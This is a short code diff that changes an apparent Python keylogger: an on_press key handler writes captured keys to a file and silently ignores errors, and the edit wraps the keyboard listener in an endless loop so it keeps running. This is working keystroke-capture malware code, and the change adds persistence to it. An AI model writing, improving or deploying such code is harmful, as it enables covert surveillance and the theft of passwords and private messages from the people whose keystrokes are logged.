@@ -6,6 +6,9 @@ def on_press(key):
     file.flush()
   except:
     pass
-listener = Listener(on_press=on_press)
-listener.start()
-listener.join()
+
+
+while True:
+  listener = Listener(on_press=on_press)
+  listener.start()
+  listener.join()
